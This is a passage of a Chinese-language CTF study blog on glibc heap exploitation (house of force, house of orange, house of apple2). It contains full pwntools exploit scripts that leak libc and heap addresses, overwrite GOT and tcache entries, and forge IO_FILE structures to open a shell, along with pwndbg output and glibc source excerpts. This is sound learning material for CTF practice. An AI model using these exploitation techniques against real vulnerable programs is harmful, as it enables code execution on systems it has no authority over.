+io.sendline(str(size)) #图二，这一步的申请没有用add，因为我们传的是一个负数，读入负数字节是不会读入内容的。
+#debug()
+add(0x18,b&#39;x&#39;*8+p64(0x400d7f)) #图三，再次申请堆区第一个chunck，在v4【1】的位置填入backdoor地址
+# debug()
+cmd(5)
+io.interactive()
+</code></pre>
+<p>图一</p>
+<p>edit语句执行后，我们已经成功改写top chunck size为0xffffffffffffffff（虽然这道题不需要这么大的size，但是当我们要攻击got表或者libc的hook时，往往需要很大的size，所以这道题也同时锻炼一下面对其他情形时使用house of force攻击的能力）</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20250427205700065.png" alt="image-20250427205700065"></p>
+<pre><code class="language-python">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x153af000
+Size: 0x20 (with flag bits: 0x21)
+
+Allocated chunk | PREV_INUSE
+Addr: 0x153af020
+Size: 0x40 (with flag bits: 0x41)
+
+Top chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
+Addr: 0x153af060
+Size: 0xfffffffffffffff8 (with flag bits: 0xffffffffffffffff)
+</code></pre>
+<p>为什么距离是-0x60但是申请的是-（0x60+8）注意-0x70计算结果也一样？</p>
+<p>首先我们需要了解强制对齐这个操作：</p>
+<pre><code class="language-c">((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK
+</code></pre>
+<p>其中req是我们申请的大小，即填入malloc函数的数据
+size_sz表达的是额外的一些空间，常被理解为header的大小，但是实际上header是size_sz大小的两倍。</p>
+<p>换一种理解方式，我们的chunck实际上是会利用到物理意义上下一个chunck的pre_size部分的，所以其实我们需要X大小的空间时，只需要X-0x8的data长度，再加上0x10的header长度，就是X+0x8。以上是在64位时的举例，事实跟计算得出的数据一样，64位的size_sz就是0x8。如果是32位的话，就是需要X，所以需要X-0x4c的data，加上0x8的header，最终是X+0x4的长度，同样32位的size_sz就是0x4
+MALLOC_ALIGN_MASK就是0xf，简单理解一下后面的加法和与运算部分，就是，如果，req+size_sz是0x10的倍数，就不改变，如果不是，即十六进制下最后一位数字大于0，那么就完成一次十六进制的进位，同时最低为清零。</p>
+<p>了解完了强制对齐，我们回到题目，此时-（0x60+0x8）进入malloc，经过强制对齐操作，就会变成申请一个0x60的chunck。</p>
+<p>补充：既然强制对齐操作后的数字都是0x10，0x20等0x10的倍数，那么如果我的目标位置与top chunck的距离不是0x10的倍数呢，此时我们就需要往前多申请一些距离，然后合理的填补那些距离，比如到got表时，注意是否需要保护got表其他的内容，然后在改我们需要改写的内容即可。
+那么这个多申请一些到底是多少呢，其实就是多申请0x10，但是如果我的数据本来就是0x10的倍数时，申请0x10不就白白多申请了0x10的距离了吗。经过计算，其实我们申请的数字直接是：distance+size_sz+0xf即可，这样无论这个distance是否是0x10的倍数，都可以最短的申请到，可以偷一个小懒。</p>
+<p>图二</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20250427210710891.png" alt="image-20250427210710891"></p>
+<p>图三</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20250427210954935.png" alt="image-20250427210954935"></p>
+<h3 id="section-38">bcloud_bctf_2016</h3><p><a href="https://www.cnblogs.com/LynneHuan/p/14616450.html#%E6%BC%8F%E6%B4%9E%E7%82%B9">bcloud_bctf_2016 - LynneHuan - 博客园 (cnblogs.com)</a></p>
+<p><a href="https://www.cnblogs.com/ZIKH26/articles/16533388.html">关于house of force的学习总结 - ZikH26 - 博客园 (cnblogs.com)</a></p>
+<p>exp</p>
+<pre><code class="language-py">from pwn import *
+#from LibcSearcher import * 
+local_file  = &#39;./pwn&#39;
+local_libc  = &#39;./libc-2.23.so&#39;
+remote_libc = &#39;./libc-2.23.so&#39;
+#remote_libc = &#39;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#39;
+select = 0
+if select == 0:
+    r = process(local_file)
+    libc = ELF(local_libc)
+else:
+    r = remote(&#39;node5.buuoj.cn&#39;,26827 )
+    libc = ELF(remote_libc)
+elf = ELF(local_file)
+context.log_level = &#39;debug&#39;
+context.arch = elf.arch
+se      = lambda data               :r.send(data)
+sa      = lambda delim,data         :r.sendafter(delim, data)
+sl      = lambda data               :r.sendline(data)
+sla     = lambda delim,data         :r.sendlineafter(delim, data)
+sea     = lambda delim,data         :r.sendafter(delim, data)
+rc      = lambda numb=4096          :r.recv(numb)
+rl      = lambda                    :r.recvline()
+ru      = lambda delims                         :r.recvuntil(delims)
+uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))
+uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))
+info    = lambda tag, addr        :r.info(tag + &#39;: {:#x}&#39;.format(addr))
+
+def debug(cmd=&#39;&#39;):
+     gdb.attach(r,cmd)
+def add(size,content):
+        sla(&#39;option---&gt;&gt;\n&#39;,&#39;1&#39;)
+        sla(&#39;Input the length of the note content:\n&#39;,str(size))
+        sa(&#39;Input the content:\n&#39;,content)
+def edit(index,content):
+        sla(&#39;option---&gt;&gt;\n&#39;,&#39;3&#39;)
+        sla(&#39;Input the id:&#39;,str(index))
+        sa(&#39;Input the new content:&#39;,content)
+def delete(index):
+        sla(&#39;option---&gt;&gt;\n&#39;,&#39;4&#39;)
+        sla(&#39;Input the id:\n&#39;,str(index))
+
+
+sa(&#39;Input your name:\n&#39;,&#39;a&#39;*0x40)
+ru(&#39;a&#39;*0x40)
+heap_addr=u32(rc(4)) #在栈上时堆地址就在40个a的上面，strcpy会将此地址一并复制
+print(&#39;heap_add==&#39;+hex(heap_addr))
+sa(&#39;Org:\n&#39;,&#39;b&#39;*0x40)
+sla(&#39;Host:\n&#39;,p32(0xFFFFFFFF)) #看ida中参数位置，40个b+org堆地址+0xffffffff
+top_chunk_ptr=heap_addr+0xd0
+heap_array_addr = 0x0804B120 #目标地址
+offest=heap_array_addr-top_chunk_ptr-0x10 #house of force的利用，计算要写入的目标地址偏移
+# debug()
+add(offest,&#39;&#39;)#0，触发house of force,将topchunk迁移至目标地址-0x8处，从而使下次add内容恰在目标地址写入，但不知为何显示时在0x804b000,但没有影响利用
+add(0x18,&#39;\n&#39;)#1  add到目标地址
+edit(1,p32(0) + p32(elf.got[&#39;free&#39;]) + p32(elf.got[&#39;puts&#39;]) + p32(0x0804B130) + b&#39;/bin/sh\x00&#39;)#chunk_arr 1已经改为了 elf.got[&#39;free]
+debug()
+edit(1,p32(elf.plt[&#39;puts&#39;]) + b&#39;\n&#39;)#修改free_got为puts_plt \n是为了停止输入函数的循环，避免了溢出其他got表
+delete(2) #调用puts_plt打印地址，下标是2
+
+libc_base=u32(rc(4))-libc.sym[&#39;puts&#39;]
+print(&#39;base=&#39;+ hex(libc_base))
+system=libc_base+libc.sym[&#39;system&#39;]
+edit(1,p32(system) + b&#39;\n&#39;)
+delete(3)
+
+r.interactive()
+</code></pre>
+<h1>house of orange</h1><h4>漏洞成因</h4><p>堆溢出写</p>
+<h4>适用范围</h4><ul>
+<li><code>2.23</code>——<code>2.27</code></li>
+<li>没有 <code>free</code></li>
+<li>可以 <code>unsortedbin attack</code></li>
+</ul>
+<h4>利用原理</h4><p><code>house of orange</code> 可以说是开启了堆与 <code>IO</code> 组合利用的先河，是非常经典、漂亮、精彩的利用组合技。利用过程还要结合 <code>top_chunk</code> 的性质，利用过程如下：</p>
+<p><strong>stage1</strong></p>
+<ul>
+<li>申请 <code>chunk A</code>，假设此时的 <code>top_chunk</code> 的 <code>size</code> 为 <code>0xWXYZ</code></li>
+<li>写 <code>A</code>，溢出修改 <code>top_chunk</code> 的 <code>size</code> 为 <code>0xXYZ</code>（需要满足页对齐的检测条件）top_chunk_add+size-1是0x1000一页的整数倍</li>
+<li>申请一个大于 <code>0xXYZ</code> 大小的 <code>chunk</code>，此时 <code>top_chunk</code> 会进行 <code>grow</code>，并将原来的 <code>old top_chunk</code> 释放进入 <code>unsortedbin</code></li>
+</ul>
+<p><strong>stage2</strong></p>
+<ul>
+<li>溢出写 <code>A</code>，修改处于 <code>unsortedbin</code> 中的 <code>old top_chunk</code>，修改其 <code>size</code> 为 <code>0x61</code>，其 <code>bk</code> 为 <code>&amp;_IO_list_all-0x10</code>，同时伪造好 <code>IO_FILE</code> 结构</li>
+<li>申请非 <code>0x60</code> 大小的 <code>chunk</code> 的时候，首先触发 <code>unsortedbin attack</code>，将<code>_IO_list_all</code> 修改为 <code>main_arena+88</code>，然后 <code>unsortedbin chunk</code> 会进入到 <code>smallbin</code>，大小为 <code>0x60</code>；接着遍历 <code>unsortedbin</code> 的时候触发了 <code>malloc_printerr</code>，然后调用链为：<code> malloc_printerr -&gt; libc_message -&gt; abort -&gt; _IO_flush_all_lockp</code>，调用到伪造的 <code>vtable</code> 里面的函数指针</li>
+</ul>
+<h4>相关技巧</h4><p>堆溢出伪造时注意：</p>
+<ul>
+<li>保证原本old top chunk的size大于MINSIZE</li>
+<li>保证原本old top chunk的prev_inuse位是1</li>
+<li>原本old top chunk的地址加上其size之后的地址要与页对齐 也就是address&amp;0xfff=0x000。</li>
+<li>old chunk的size要小于申请的堆块大小加上MINSIZE</li>
+</ul>
+<p>注意：如果申请的堆块大小大于0x20000，那么申请到的将会是mmap映射出来的内存而不会拓展topchunk了</p>
+<ul>
+<li>在 <code>glibc-2.24</code> 后加入了 <code>vtable</code> 的 <code>check</code>，不能任意地址伪造 <code>vatble</code> 了，但是可以利用 <code>IO_str_jumps</code> 结构进行利用。</li>
+<li>在 <code>glibc-2.26</code> 后，<code>malloc_printerr</code> 不再刷新 <code>IO</code> 流了，所以该方法失效</li>
+<li>由于<code>_mode</code> 的正负性是随机的，影响判断条件，大概有 <code>1/2</code> 的概率会利用失败，多试几次就好</li>
+</ul>
+<h4>利用效果</h4><ul>
+<li>任意函数执行</li>
+<li>任意命令执行</li>
+</ul>
+<h4>例题</h4><h4>house of orange</h4><p><a href="https://www.cnblogs.com/xshhc/p/17327672.html">house of orange 详解 - xshhc - 博客园 (cnblogs.com)</a>讲了FSOP</p>
+<p><a href="https://makabaka-yyds.github.io/2021/11/03/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bhouse-of-orange/#IO-FILE-%E7%BB%93%E6%9E%84">堆利用之house of orange (makabaka-yyds.github.io)</a></p>
+<p><a href="https://xz.aliyun.com/t/12902?time__1311=GqGxuD9QiQdCqGN4lxmOxf2jQIhzGbD#toc-10">House of orange及其IO组合攻击学习利用 - 先知社区 (aliyun.com)</a><a href="https://xz.aliyun.com/t/12902?time__1311=GqGxuD9QiQdCqGN4lxmOxf2jQIhzGbD#toc-10">House of orange及其IO组合攻击学习利用 - 先知社区 (aliyun.com)</a>第一个例题</p>
+<p>exp</p>
+<pre><code class="language-py">from pwn import *
+context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
+pwnfile = &quot;./pwn&quot;
+io = remote(&quot;challenge-9561693a08b85dd4.sandbox.ctfhub.com&quot;,28608)
+#io = process(pwnfile)
+elf = ELF(pwnfile)
+libc = ELF(&quot;./libc-2.23.so&quot;)
+def debg():
+    gdb.attach(io)
+
+s       = lambda data               :io.send(data)
+sa      = lambda delim,data         :io.sendafter(delim, data)
+sl      = lambda data               :io.sendline(data)
+sla     = lambda delim,data         :io.sendlineafter(delim, data)
+r       = lambda num=4096           :io.recv(num)
+ru      = lambda delims         :io.recvuntil(delims)
+itr     = lambda                    :io.interactive()
+uu32    = lambda data               :u32(data.ljust(4,b&#39;\x00&#39;))
+uu64    = lambda data               :u64(data.ljust(8,b&#39;\x00&#39;))
+leak    = lambda name,addr          :log.success(&#39;{} = {:#x}&#39;.format(name, addr))
+lg      = lambda address,data       :log.success(&#39;%s: &#39;%(address)+hex(data))
+
+def add(size,data):
+    ru(b&quot;Input your choice &gt;&gt; \n&quot;)
+    sl(b&quot;1&quot;)
+    ru(b&quot;How long is your note?&quot;)
+    sl(str(size))
+    ru(b&quot;Please write your note now:&quot;)
+    s(data)
+def show():
+    ru(b&quot;Input your choice &gt;&gt; \n&quot;)
+    sl(b&quot;2&quot;)
+def edit(idx,size,data):
+    ru(b&quot;Input your choice &gt;&gt; \n&quot;)
+    sl(b&quot;3&quot;)
+    ru(b&quot;Which note do you want to change?&quot;)
+    sl(str(idx))
+    ru(b&quot;Please input the size of your note:&quot;)
+    sl(str(size))
+    ru(b&quot;Please write your new note:&quot;)
+    s(data)
+
+add(0x20,b&quot;aaaa&quot;)#0
+edit(0,-1,p64(0)*5+p64(0xfd1))
+add(0x1000,b&quot;a&quot;)#1 触发orange进入top chunk进入unsorted bin
+# dbg()
+add(0x400,b&quot;b&quot;*8)#2 和堆块1是同一个首地址。恰好达到large_bin 0x400大小，触发遍历unsorted bin的时候（但调试看来申请0x30大小效果也一样，不一定非要0x400），会将其中的堆块分类放入small bin或者large bin中，这样这个堆块就会被分到large bin中，然后启用fd_nextsize和bk_nextsize指针(当前堆地址在这上面)
+
+show()
+ru(b&quot;b&quot;*8)
+main_arena = uu64(r(6))
+libc_base = main_arena-1640-0x10-libc.sym[&#39;__malloc_hook&#39;]
+io_list_all = libc_base+libc.sym[&quot;_IO_list_all&quot;]
+system = libc_base+libc.sym[&quot;system&quot;]
+print(&quot;libc_base: &quot;,hex(libc_base))
+print(&quot;io_list_all: &quot;,hex(io_list_all))
+
+edit(2,-1,b&quot;c&quot;*0x10)
+
+show()
+ru(b&quot;c&quot;*0x10)
+heap_addr = uu64(r(6))-0x30#-0x30此时代表第一个堆的地址
+print(&quot;heap_addr: &quot;,hex(heap_addr))
+
+payload = b&quot;a&quot;*0x400
+#如果我们在 _IO_list_all 利用 unsorted bin attack 写入 main_arena_88 ，那么，main_arena_88 就会被当成一个 _IO_FILE 结构体，而 main_arena_88 + 0x68 = main_arena_C0 ，也就是 _IO_FILE 结构体中存放 chain 指针的地方，也是存放 0x60 大小 small bin 第一个 free chunk 地址的地方，如果我们伪造一个 small bin 为 _IO_FILE 结构体，那么我们就能够准确地劫持程序了
+fake = b&quot;/bin/sh\x00&quot;+p64(0x61)
+fake += p64(0)+p64(io_list_all-0x10)#后面malloca时0x60进入small bin
+fake += p64(0)+p64(1)
+fake = fake.ljust(0xd8,b&quot;\x00&quot;)
+fake += p64(heap_addr+0x520)
+fake += p64(0)*3+p64(system)
+payload += fake
+
+edit(2,-1,payload)
+
+# add(0x10,b&#39;a&#39;) 不能用add因为ru()会收不到后面消息卡住
+ru(b&quot;Input your choice &gt;&gt; \n&quot;)
+sl(b&quot;1&quot;)
+ru(b&quot;How long is your note?&quot;)
+sl(str(0x10)) #调用malloc函数触发abort()刷新IO文件流getshell，同时触发unsorted bin attack
+
+itr()
+</code></pre>
+<h4>buu ezheap 劫持tcache结构体，enviro堆栈结合</h4><p>2.27</p>
+<p><a href="https://blog.csdn.net/2301_79696060/article/details/142448960?ops_request_misc=%7B%22request%5Fid%22%3A%22FDC4B34D-7A34-4867-A150-A429E6FE7CB3%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=FDC4B34D-7A34-4867-A150-A429E6FE7CB3&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-142448960-null-null.142%5Ev100%5Epc_search_result_base7&utm_term=bytectf&spm=1018.2226.3001.4187">2024ByteCTF-PWN-ezheap-CSDN博客</a></p>
+<p><a href="https://xz.aliyun.com/t/12714?time__1311=GqGxu7i%3DituDlrzG7DyDmOmoDkbo%2BoEox#toc-0">劫持tcache_struct与setcontext - 先知社区 (aliyun.com)</a></p>
+<p>exp</p>
+<pre><code class="language-py">from pwn import *
+context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
+#context.update(arch=&#39;i386&#39;,os=&#39;linux&#39;,log_level=&#39;debug&#39;)
+# context(os=&#39;linux&#39;, arch=&#39;amd64&#39;)
+file_name = &quot;./pwn&quot;
+e = ELF(file_name)
+p= process(file_name)
+lib = &#39;./libc-2.27.so&#39;
+select=0
+if select == 0:
+    p=process(file_name)
+    libc = ELF(lib)
+else:
+    p=remote(&#39;&#39;)
+    libc = ELF(lib)
+def debug():
+    gdb.attach(p)
+    #gdb.attach(p,&#39;b *0x\nc&#39;)
+sd = lambda s : p.send(s)
+sl = lambda s : p.sendline(s)
+sa = lambda n,s : p.sendafter(n,s)
+sla = lambda n,s : p.sendlineafter(n,s)
+rc = lambda n : p.recv(n)
+rl = lambda : p.recvline()
+ru = lambda s : p.recvuntil(s)
+ra = lambda : p.recvall()
+it = lambda : p.interactive()
+uu32 = lambda data : u32(data.ljust(4, b&#39;\x00&#39;))
+uu64 = lambda data : u64(data.ljust(8, b&#39;\x00&#39;))
+def add(size):
+    sla(b&#39;to exit:&#39;, b&#39;1&#39;)
+    sla(b&#39;Enter size to add:&#39;, str(size))
+def free(size):
+    sla(b&#39;to exit:&#39;, b&#39;2&#39;)
+    sla(b&#39;Enter size to free:&#39;, str(size))
+def show(idx):
+    sla(b&#39;to exit:&#39;, b&#39;3&#39;)
+    sla(b&#39;Enter index to show:&#39;, str(idx))
+
+def edit(idx,size,content):
+    sla(b&#39;to exit:&#39;, b&#39;4&#39;)
+    sla(b&#39;Enter index to edit:&#39;, str(idx))
+    sla(b&#39;input size&#39;, str(size))
+    sla(b&#39;input&#39;, content)
+
+add(0x10)#0
+pa=p64(0)*3+p64(0xd91) #d90满足页对齐
+edit(0,0x20,pa) 
+# debug()
+add(0xf00) #1,找一块不相邻的内存add(可以看chunklist查看)，同时把old_top放入unsorted bin
+add(0x30) #2 从unsorted bin拿
+show(2)
+ru(&#39;: &#39;)
+base=u64(rc(6).ljust(8,b&#39;\x00&#39;))-0x3ec2a0
+print(&quot;base:&quot;,hex(base))
+edit(2,0x10,b&#39;a&#39;*15+b&#39;b&#39;)
+show(2)
+ru(&#39;b&#39;)
+heap_base=u64(rc(6).ljust(8,b&#39;\x00&#39;))-0x20a-66-0x24
+print(&quot;heap_base:&quot;,hex(heap_base))
+
+one_gadget = base + 0x10a38c
+
+
+add(0xd20) #3
+# debug()
+add(0x10) #4这是紧接在堆块1后面的，所以用vis heap 命令看不见内存。用tel看
+
+edit(4,0x100,b&quot;a&quot;*0x10+p64(0)+p64(0xd1))
+# debug()
+add(0xf0) #5，第二次orange
+edit(4,0x100,p64(0)*3+p64(0xb1)+p64(heap_base+0x10)*2) 
+add(0xa0) #6
+add(0xa0) #7，也是tcache，是heap_base做好了劫持tcache的准备工作，现在tcache空了
+
+environ = base + 0x3EE098
+print(&quot;environ: &quot;,hex(environ))
+edit(7,0x60,b&quot;0&quot;*0x40+p64(0)+p64(environ))#劫持tcache结构体，bin会显示所有tcache
+# debug()
+add(0x28) #8
+show(8)
+ru(&#39;8: &#39;)
+stack = u64(p.recvuntil(b&quot;\x0a&quot;)[-8:-1].ljust(8, b&quot;\x00&quot;))
+attack_addr = stack - 288
+print(f&quot;stack: {hex(stack)}&quot;) #是edit函数的栈帧返回地址，因为main函数无法正常推退出
+edit(7,0x60,b&quot;0&quot;*0x40+p64(0)+p64(0)+p64(attack_addr))
+
+add(0x38) #9
+debug()
+edit(9,0x38,p64(one_gadget)) #
+
+it()
+</code></pre>
+<h1>house of apple2</h1><p><a href="https://xz.aliyun.com/news/16212?time__1311=eqUxnQitDtG%3Di%3DNDQD%2FfPq7KqiIHthkokh8iD&u_atoken=506616d6b3bc7a0e233eb408393c1604&u_asig=ac11000117434253925022634e0145">高效IO利用方法总结--House of apple2</a></p>
+<p><a href="https://blog.csdn.net/2301_79327647/article/details/140921253">浅析house_of_apple2（上）</a></p>
+<h2 id="section-39">介绍</h2><pre><code>house of apple2可以说是高版本中所需利用条件最少的攻击方式
+适用2.35及以后版本
+能泄露出heap地址和libc地址
+能使用一次largebin attack
+能控制程序执行IO操作，包括但不限于：从main函数返回、调用exit函数、通过__malloc_assert触发
+能控制_IO_FILE的vtable和_wide_data，一般使用largebin attack去控制
+</code></pre>
+<h2 id="section-40">原理</h2><h3 id="section-41">绕过vtable check</h3><p>​	house of apple2主要是通过伪造FILE结构体来完成攻击，而在2.24以后的glibc中，FILE结构体中的Vtable指针不能被劫持到任意地址，会有一个IO_validate_vtable函数对其指向的地址进行检测，下面是它的源码</p>
+<pre><code class="language-c">IO_validate_vtable (const struct _IO_jump_t *vtable)
+{
+  /*快速路径：vtable 指针位于 __libc_IO_vtables 部分内。*/
+  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
+  uintptr_t ptr = (uintptr_t) vtable;
+  uintptr_t offset = ptr - (uintptr_t) __start___libc_IO_vtables;
+  if (__glibc_unlikely (offset &gt;= section_length))
+    /*vtable 指针不在预期的部分中。 使用慢速路径，如有必要，该路径将终止进程。*/
+    _IO_vtable_check ();
+  return vtable;
+}
+</code></pre>
+<p>​	就是说glibc中是有一段完整的内存存放着各个vtable，其中__start___libc_IO_vtables指向第一个vtable地址_IO_helper_jumps，而__stop___libc_IO_vtables指向最后一个vtable_IO_str_chk_jumps结束的地址</p>
+<p><img src="/__published_media/external/%E5%9B%BE%E5%BA%93/image-20250401215744551.png" alt="image-20250401215744551"></p>
+<p>往常覆盖vtable到堆栈上的方式无法绕过此检查，会进入到<code>_IO_vtable_check</code>检查中,进入该函数意味着目前的vtable不是glibc中的vtable，因此_IO_vtable_check判断程序是否使用了外部合法的vtable（重构或是动态链接库中的vtable），如果不是则报错。</p>
+<p>总结一下：</p>
+<p>判断vtable的地址是否处于glibc中的vtable数组段，是的话，通过检查。
+否则判断是否为外部的合法vtable（重构或是动态链接库中的vtable），是的话，通过检查。
+否则报错，输出&quot;Fatal error: glibc detected an invalid stdio handle，&quot;程序退出。</p>
+<p>怎么绕过？
+很显然，绕过方式我们只能去考虑怎么去绕过_IO_vtable_check函数的检查，根据_IO_vtable_check的检查机制，我们有两个方法：</p>
+<pre><code class="language-c">1.flag == &amp;_IO_vtable_check
+
+2.rtld_active ()==0c
+   或者(_dl_addr (_IO_vtable_check, &amp;di, &amp;l, NULL) != 0 &amp;&amp; l-&gt;l_ns != LM_ID_BASE)
+</code></pre>
+<p>第一种方式不可控，因为flag的检查机制类似于canary，是从栈上取数据的，我们难以控制。</p>
+<p>第二种办法好操作的只有rtld_active ()==0，就是去篡改dl_init_all_dirs，但是我们都能篡改dl_init_all_dirs,那我们在低版本下就可以去篡改hook了，这对house_of_apple2的通杀性有影响。</p>
+<p><strong>所以提出了先使用内部的vtable数组内的IO_wfile_jumps、IO_wfile_jumps_mmap、IO_wfile_jumps_maybe_mmap等来对vtable进行篡改，从而可以调用IO_wfile_overflow，从而控制IO_wide_data为可控的堆地址空间，进而控制IO_wide_data-&gt;_wide_vtable为可控的堆地址空间，来进行利用。</strong></p>
+<p>house of apple2主要针对的是_IO_FILE中的__wide_data成员，_wide_data指向的结构体是一个和FILE结构体十分相像的wide_data结构体，下面是他的内容</p>
+<pre><code class="language-c">pwndbg&gt; p _IO_wide_data_2
+$2 = {
+  _IO_read_ptr = 0x0,
+  _IO_read_end = 0x0,
+  _IO_read_base = 0x0,
+  _IO_write_base = 0x0,
+  _IO_write_ptr = 0x0,
+  _IO_write_end = 0x0,
+  _IO_buf_base = 0x0,
+  _IO_buf_end = 0x0,
+  _IO_save_base = 0x0,
+  _IO_backup_base = 0x0,
+  _IO_save_end = 0x0,
+  _IO_state = {
+    __count = 0,
+    __value = {
+      __wch = 0,
+      __wchb = &quot;\000\000\000&quot;
+    }
+  },
+  _IO_last_state = {
+    __count = 0,
+    __value = {
+      __wch = 0,
+      __wchb = &quot;\000\000\000&quot;
+    }
+  },
+  _codecvt = {
+    __cd_in = {
+      step = 0x0,
+      step_data = {
+        __outbuf = 0x0,
+        __outbufend = 0x0,
+        __flags = 0,
+        __invocation_counter = 0,
+        __internal_use = 0,
+        __statep = 0x0,
+        __state = {
+          __count = 0,
+          __value = {
+            __wch = 0,
+            __wchb = &quot;\000\000\000&quot;
+          }
+        }
+      }
+    },
+    __cd_out = {
+      step = 0x0,
+      step_data = {
+        __outbuf = 0x0,
+        __outbufend = 0x0,
+        __flags = 0,
+        __invocation_counter = 0,
+        __internal_use = 0,
+        __statep = 0x0,
+        __state = {
+          __count = 0,
+          __value = {
+            __wch = 0,
+            __wchb = &quot;\000\000\000&quot;
+          }
+        }c
+      }
+    }
+  },
+  _shortbuf = L&quot;&quot;,
+  _wide_vtable = 0x7ffff7e170c0 &lt;_IO_wfile_jumps&gt;
+}
+</code></pre>
+<pre><code class="language-c">const struct _IO_jump_t _IO_wfile_jumps =
+{
+  JUMP_INIT_DUMMY,
+  JUMP_INIT(finish, _IO_new_file_finish),
+  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),
+  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),
+  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
+  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),
+  JUMP_INIT(xsputn, _IO_wfile_xsputn),
+  JUMP_INIT(xsgetn, _IO_file_xsgetn),
+  JUMP_INIT(seekoff, _IO_wfile_seekoff),
+  JUMP_INIT(seekpos, _IO_default_seekpos),
+  JUMP_INIT(setbuf, _IO_new_file_setbuf),
+  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),
+  JUMP_INIT(doallocate, _IO_wfile_doallocate),
+  JUMP_INIT(read, _IO_file_read),
+  JUMP_INIT(write, _IO_new_file_write),
+  JUMP_INIT(seek, _IO_file_seek),
+  JUMP_INIT(close, _IO_file_close),
+  JUMP_INIT(stat, _IO_file_stat),
+  JUMP_INIT(showmanyc, _IO_default_showmanyc),
+  JUMP_INIT(imbue, _IO_default_imbue)
+};
+</code></pre>
+<p>​	同样具有一个vtable指针去指向一个虚表，而<strong>这个vtable指针所指向的内容是没有检测</strong>的，这意味着我们可以把它劫持到我们伪造的虚表，从而控制执行流</p>
+<h3 id="section-42">exit调用链和源码分析</h3><p>roderick01 师傅在文章里一共给出了三条可行的能执行到 <code>_IO_Wxxxxx</code> 函数的利用,包括了：</p>
+<ul>
+<li>_IO_wfile_overflow</li>
+<li>_IO_wfile_underflow_mmap</li>
+<li>_IO_wdefault_xsgetn</li>
+</ul>
+<h4>_IO_wfile_overflow链子</h4><pre><code class="language-c">调用链
+exit -&gt; __run_exit_handlers -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_wfile_overflow -&gt; _IO_wdoallocbuf -&gt; _IO_WDOALLOCATE -&gt;target
+</code></pre>
+<h5>_IO_wfile_overflow</h5><pre><code class="language-c">wint_t
+_IO_wfile_overflow (FILE *f, wint_t wch)
+{
+  if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */
+    {
+      f-&gt;_flags |= _IO_ERR_SEEN;
+      __set_errno (EBADF);
+      return WEOF;
+    }
+  /*如果当前正在读取或未分配缓冲区。*/
+  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0)
+    {
+      /* Allocate a buffer if needed. */
+      if (f-&gt;_wide_data-&gt;_IO_write_base == 0)
+	{
+	  _IO_wdoallocbuf (f);
+	  _IO_free_wbackup_area (f);
+	  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,
+		     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);
+ 
+	  if (f-&gt;_IO_write_base == NULL)
+	    {
+	      _IO_doallocbuf (f);
+	      _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);
+	    }
+	}
+      else
+	{
+	  /*否则必须正在阅读。 如果 _IO_read_ptr（因此也_IO_read_end）位于缓冲区端，则在逻辑上将缓冲区向前滑动一个块（通过将读取指针设置为块开头的所有点）。 这为后续输出腾出了空间。否则，请将读取指针设置为 _IO_read_end（不理会该指针，以便它可以继续对应于外部位置）。*/
+	  if (f-&gt;_wide_data-&gt;_IO_read_ptr == f-&gt;_wide_data-&gt;_IO_buf_end)
+	    {
+	      f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;
+	      f-&gt;_wide_data-&gt;_IO_read_end = f-&gt;_wide_data-&gt;_IO_read_ptr =
+		f-&gt;_wide_data-&gt;_IO_buf_base;
+	    }
+	}
+      f-&gt;_wide_data-&gt;_IO_write_ptr = f-&gt;_wide_data-&gt;_IO_read_ptr;
+      f-&gt;_wide_data-&gt;_IO_write_base = f-&gt;_wide_data-&gt;_IO_write_ptr;
+      f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_buf_end;
+      f-&gt;_wide_data-&gt;_IO_read_base = f-&gt;_wide_data-&gt;_IO_read_ptr =
+	f-&gt;_wide_data-&gt;_IO_read_end;
+ 
+      f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;
+      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;
+      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;
+      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;
+ 
+      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;
+      if (f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))
+	f-&gt;_wide_data-&gt;_IO_write_end = f-&gt;_wide_data-&gt;_IO_write_ptr;
+    }
+  if (wch == WEOF)
+    return _IO_do_flush (f);
+  if (f-&gt;_wide_data-&gt;_IO_write_ptr == f-&gt;_wide_data-&gt;_IO_buf_end)
+    /*缓冲区真的很满*/
+    if (_IO_do_flush (f) == EOF)
+      return WEOF;
+  *f-&gt;_wide_data-&gt;_IO_write_ptr++ = wch;
+  if ((f-&gt;_flags &amp; _IO_UNBUFFERED)
